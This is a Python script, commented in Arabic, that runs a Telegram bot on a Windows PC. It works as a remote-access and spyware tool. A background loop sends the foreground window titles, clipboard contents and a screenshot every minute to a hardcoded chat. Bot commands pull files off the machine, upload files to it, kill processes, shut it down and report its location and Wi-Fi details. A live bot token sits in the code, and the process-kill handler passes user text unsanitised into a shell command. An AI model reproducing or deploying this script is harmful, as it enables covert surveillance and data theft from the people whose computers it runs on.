import telebot
from telebot import types
import pyautogui
import pyperclip
import os
import time
import requests
import subprocess
import win32gui
import threading
import webbrowser
import sys
import ctypes
from datetime import datetime

# --- 1. ضمان عمل السكربت في الخلفية ---
try:
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
except:
    pass

# --- إعدادات البوت ---
TOKEN = "7441270348:AAE7SFRVxepMoBIw2IGXsbtVM0cf5ryBXAA"
MY_ID = 1431886140

bot = telebot.TeleBot(TOKEN)

# إعدادات النظام
SCREENSHOT_INTERVAL = 60
current_path = os.getcwd()
clipboard_history = []
LOG_FILE = f"Log_{datetime.now().strftime('%Y-%m-%d')}.txt"
file_map = {} 

# تحديد مسار مجلد "محمود" على سطح المكتب
DESKTOP_PATH = os.path.join(os.path.expanduser("~"), "Desktop")
SAVE_DIR = os.path.join(DESKTOP_PATH, "محمود")

# إنشاء المجلد فوراً إذا لم يكن موجوداً
if not os.path.exists(SAVE_DIR):
    try:
        os.makedirs(SAVE_DIR)
    except:
        pass

# --- 2. دوال مساعدة ---
def is_authorized(user_id):
    return user_id == MY_ID

def log_event(text):
    timestamp = datetime.now().strftime("%H:%M:%S")
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f: f.write(f"[{timestamp}] {text}\n")
    except: pass

def create_main_keyboard():
    """لوحة التحكم الشاملة"""
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    
    # أزرار الطوارئ والتشغيل
    markup.add(types.KeyboardButton('✅ تأكيد التشغيل'), types.KeyboardButton('🔴 إغلاق الجهاز'))
    
    # الصف 2
    markup.add(types.KeyboardButton('📸 لقطة شاشة'), types.KeyboardButton('📂 مدير الملفات'))
    # الصف 3
    markup.add(types.KeyboardButton('📩 إرسال رسالة'), types.KeyboardButton('🌐 فتح رابط'))
    # الصف 4
    markup.add(types.KeyboardButton('☠️ قتل برنامج'), types.KeyboardButton('📍 الموقع'))
    # الصف 5
    markup.add(types.KeyboardButton('📶 الشبكة'), types.KeyboardButton('📝 إنشاء مجلد'))
    # الصف 6
    markup.add(types.KeyboardButton('📋 سجل الحافظة'), types.KeyboardButton('📜 تحميل السجل'))
    
    return markup

# --- 3. المراقبة التلقائية ---
def automatic_monitor():
    last_window = ""
    last_clipboard = ""
    last_screenshot_time = time.time()
    
    try:
        bot.send_message(MY_ID, f"🚀 **تم تشغيل النظام (V11)**\n📂 مجلد الاستقبال: Desktop/محمود", reply_markup=create_main_keyboard())
    except: pass

    while True:
        try:
            timestamp = datetime.now().strftime("%H:%M:%S")
            
            # أ) مراقبة النوافذ
            try:
                window = win32gui.GetForegroundWindow()
                curr_window = win32gui.GetWindowText(window)
            except: curr_window = ""

            if curr_window and curr_window != last_window:
                bot.send_message(MY_ID, f"👀 **[نشاط]** {curr_window}")
                log_event(f"نافذة: {curr_window}")
                last_window = curr_window

            # ب) مراقبة الحافظة
            try:
                curr_clip = pyperclip.paste()
                if curr_clip and curr_clip != last_clipboard:
                    bot.send_message(MY_ID, f"📋 **[نسخ]**\n{curr_clip}")
                    clipboard_history.append(f"[{timestamp}] {curr_clip}")
                    log_event(f"نسخ: {curr_clip}")
                    last_clipboard = curr_clip
            except: pass

            # ج) صورة تلقائية
            if time.time() - last_screenshot_time > SCREENSHOT_INTERVAL:
                try:
                    shot = "auto.png"
                    pyautogui.screenshot(shot)
                    with open(shot, 'rb') as f: bot.send_photo(MY_ID, f, caption=f"🔄 {timestamp}")
                    os.remove(shot)
                except: pass
                last_screenshot_time = time.time()

            time.sleep(1.5)
        except: time.sleep(5)

# --- 4. معالجة الملفات القادمة من التيليجرام (الجديد) ---
@bot.message_handler(content_types=['document', 'photo', 'video', 'audio'])
def handle_files_upload(message):
    if not is_authorized(message.chat.id): return
    
    try:
        bot.reply_to(message, "⏳ جاري تحميل الملف إلى اللابتوب...")
        
        # تحديد نوع الملف واسمه
        if message.content_type == 'document':
            file_name = message.document.file_name
            file_id = message.document.file_id
        elif message.content_type == 'photo':
            # الصور في تيليجرام ليس لها اسم، ننشئ اسماً بالتوقيت
            file_name = f"img_{int(time.time())}.jpg"
            file_id = message.photo[-1].file_id # أكبر دقة
        elif message.content_type == 'video':
            file_name = message.video.file_name if message.video.file_name else f"vid_{int(time.time())}.mp4"
            file_id = message.video.file_id
        else:
            file_name = f"file_{int(time.time())}"
            file_id = getattr(message, message.content_type).file_id

        # تحميل الملف
        file_info = bot.get_file(file_id)
        downloaded_file = bot.download_file(file_info.file_path)

        # التأكد من وجود المجلد
        if not os.path.exists(SAVE_DIR):
            os.makedirs(SAVE_DIR)

        # حفظ الملف
        save_path = os.path.join(SAVE_DIR, file_name)
        with open(save_path, 'wb') as new_file:
            new_file.write(downloaded_file)

        bot.reply_to(message, f"✅ تم حفظ الملف بنجاح!\n📂 المسار: Desktop/محمود/{file_name}")
        log_event(f"استقبال ملف: {file_name}")

    except Exception as e:
        bot.reply_to(message, f"❌ حدث خطأ أثناء التحميل: {e}")

# --- 5. أوامر التحكم ---

# أ) إغلاق الجهاز (Shutdown) - الجديد
@bot.message_handler(func=lambda m: m.text == '🔴 إغلاق الجهاز')
def shutdown_pc(message):
    if not is_authorized(message.chat.id): return
    bot.reply_to(message, "👋 تم استلام الأمر.\nسيتم إغلاق الجهاز (Shutdown) خلال 5 ثواني.")
    # الأمر /s للإغلاق، /t 5 للانتظار 5 ثواني
    os.system("shutdown /s /t 5")

# ب) إرسال رسالة
@bot.message_handler(func=lambda m: m.text == '📩 إرسال رسالة')
def ask_message_text(message):
    if not is_authorized(message.chat.id): return
    msg = bot.reply_to(message, "💬 اكتب الرسالة:")
    bot.register_next_step_handler(msg, perform_send_message)

def perform_send_message(message):
    text = message.text
    threading.Thread(target=lambda: ctypes.windll.user32.MessageBoxW(0, text, "رسالة إدارية", 0x40 | 0x1000)).start()
    bot.reply_to(message, f"✅ تم الإظهار:\n{text}")

# ج) تأكيد التشغيل
@bot.message_handler(func=lambda m: m.text == '✅ تأكيد التشغيل')
def confirm_running(message):
    if not is_authorized(message.chat.id): return
    status_msg = (
        f"✅ **النظام يعمل!**\n"
        f"📅 الوقت: {datetime.now().strftime('%I:%M %p')}\n"
        f"💻 المستخدم: {os.getlogin()}\n"
        f"📂 حفظ الملفات في: Desktop/محمود"
    )
    bot.reply_to(message, status_msg)

# د) فتح رابط
@bot.message_handler(func=lambda m: m.text == '🌐 فتح رابط')
def ask_link(message):
    if not is_authorized(message.chat.id): return
    msg = bot.reply_to(message, "🔗 الرابط:")
    bot.register_next_step_handler(msg, lambda m: webbrowser.open(m.text if m.text.startswith('http') else 'https://'+m.text) or bot.reply_to(m, "✅ تم"))

# هـ) قتل برنامج
@bot.message_handler(func=lambda m: m.text == '☠️ قتل برنامج')
def ask_kill(message):
    if not is_authorized(message.chat.id): return
    msg = bot.reply_to(message, "اسم البرنامج (chrome.exe):")
    bot.register_next_step_handler(msg, lambda m: os.system(f"taskkill /f /im {m.text}") and bot.reply_to(m, "تم"))

# --- 6. مدير الملفات ---
def get_file_keyboard(path):
    global file_map
    file_map = {} 
    markup = types.InlineKeyboardMarkup()
    try:
        items = os.listdir(path)
        folders = [f for f in items if os.path.isdir(os.path.join(path, f))]
        files = [f for f in items if os.path.isfile(os.path.join(path, f))]
        
        markup.add(types.InlineKeyboardButton("⬆️ ...رجوع للخلف", callback_data="CD_UP"))
        
        for i, folder in enumerate(folders[:10]): 
            file_key = f"DIR_{i}"
            file_map[file_key] = folder 
            markup.add(types.InlineKeyboardButton(f"📁 {folder}", callback_data=file_key))
            
        for i, file in enumerate(files[:10]):
            file_key = f"FILE_{i}"
            file_map[file_key] = file
            markup.add(types.InlineKeyboardButton(f"📄 {file}", callback_data=file_key))
            
    except Exception as e:
        markup.add(types.InlineKeyboardButton(f"خطأ: {str(e)[:15]}", callback_data="NONE"))
    return markup

@bot.message_handler(func=lambda m: m.text == '📂 مدير الملفات')
def open_file_manager(message):
    if not is_authorized(message.chat.id): return
    global current_path
    if current_path == "": current_path = os.getcwd()
    bot.send_message(message.chat.id, f"📂 `{current_path}`", parse_mode="Markdown", reply_markup=get_file_keyboard(current_path))

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    if not is_authorized(call.message.chat.id): return
    global current_path, file_map
    data = call.data
    
    try:
        if data == "CD_UP":
            current_path = os.path.dirname(current_path)
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                text=f"📂 `{current_path}`", parse_mode="Markdown", reply_markup=get_file_keyboard(current_path))

        elif data in file_map:
            real_name = file_map[data]
            if data.startswith("DIR_"):
                current_path = os.path.join(current_path, real_name)
                bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                    text=f"📂 `{current_path}`", parse_mode="Markdown", reply_markup=get_file_keyboard(current_path))
            
            elif data.startswith("FILE_"):
                file_path = os.path.join(current_path, real_name)
                bot.answer_callback_query(call.id, "جاري الرفع...")
                with open(file_path, 'rb') as f: bot.send_document(call.message.chat.id, f)

    except Exception as e:
        bot.answer_callback_query(call.id, f"Error: {e}")

# --- 7. باقي الأدوات ---

@bot.message_handler(func=lambda m: m.text == '📝 إنشاء مجلد')
def ask_mkdir(message):
    if not is_authorized(message.chat.id): return
    msg = bot.reply_to(message, "اسم المجلد:")
    bot.register_next_step_handler(msg, lambda m: os.makedirs(os.path.join(current_path, m.text), exist_ok=True) or bot.reply_to(m, "تم"))

@bot.message_handler(func=lambda m: m.text == '📸 لقطة شاشة')
def screen(m):
    if not is_authorized(m.chat.id): return
    try:
        shot = os.path.join(os.getcwd(), "s.png")
        pyautogui.screenshot(shot)
        with open(shot, 'rb') as f: bot.send_photo(m.chat.id, f)
        os.remove(shot)
    except: pass

@bot.message_handler(func=lambda m: m.text == '📍 الموقع')
def loc(m):
    if not is_authorized(m.chat.id): return
    try:
        r = requests.get("http://ip-api.com/json/").json()
        bot.reply_to(m, f"📍 {r['city']}, {r['country']}\n{r['query']}")
    except: pass

@bot.message_handler(func=lambda m: m.text == '📶 الشبكة')
def wifi(m):
    if not is_authorized(m.chat.id): return
    try:
        r = subprocess.check_output(["netsh", "wlan", "show", "interfaces"]).decode("utf-8", errors="ignore")
        bot.reply_to(m, r[:3000])
    except: pass

@bot.message_handler(func=lambda m: m.text == '📋 سجل الحافظة')
def history(m):
    if not is_authorized(m.chat.id): return
    bot.reply_to(m, "\n".join(clipboard_history[-15:]) if clipboard_history else "فارغ")

@bot.message_handler(func=lambda m: m.text == 'ℹ️ معلومات النظام')
def sys_info(m):
    if not is_authorized(m.chat.id): return
    bot.reply_to(m, f"👤 {os.getlogin()}\n💻 {os.getcwd()}")

@bot.message_handler(func=lambda m: m.text == '📜 تحميل السجل')
def dl_log(m):
    if not is_authorized(m.chat.id): return
    try:
        with open(LOG_FILE, 'rb') as f: bot.send_document(m.chat.id, f)
    except: bot.reply_to(m, "لا يوجد سجل.")

# --- التشغيل ---
if __name__ == "__main__":
    t = threading.Thread(target=automatic_monitor)
    t.daemon = True
    t.start()
    while True:
        try:
            bot.infinity_polling(timeout=10, long_polling_timeout=5)
        except: time.sleep(5)